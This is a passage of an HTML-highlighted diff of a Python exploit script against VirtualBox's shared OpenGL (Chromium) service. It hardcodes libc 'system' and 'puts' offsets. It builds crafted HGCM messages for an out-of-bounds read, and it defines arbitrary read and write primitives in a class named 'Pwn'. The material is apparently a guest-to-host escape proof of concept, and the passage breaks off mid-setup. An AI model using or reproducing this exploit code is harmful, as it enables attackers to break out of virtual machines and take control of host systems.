+&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/lib&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;chromium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hgcm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20890&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;vbox_puts_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x22f0f0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc_puts_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x809c0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;libc_system_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4f440&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_GETUNIFORMLOCATION_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;LEET&#39;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUFSZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;Q&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
+        &lt;span class=&quot;sd&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;        msg2= pack(&quot;&amp;lt;III&quot;, CR_MESSAGE_OPCODES, 0x41414141, 1) \&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;              + &#39;\0\0\0&#39; + chr(CR_EXTEND_OPCODE) \&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;              + &#39;aaaa&#39; \&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;              + pack(&quot;&amp;lt;I&quot;, CR_SHADERSOURCE_EXTEND_OPCODE) \&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;              + pack(&quot;&amp;lt;IIIII&quot;, 0, 0x2, 0, 0x1, 0x1a+2) +&#39;A&#39;*4&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;        &#39;&#39;&#39;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
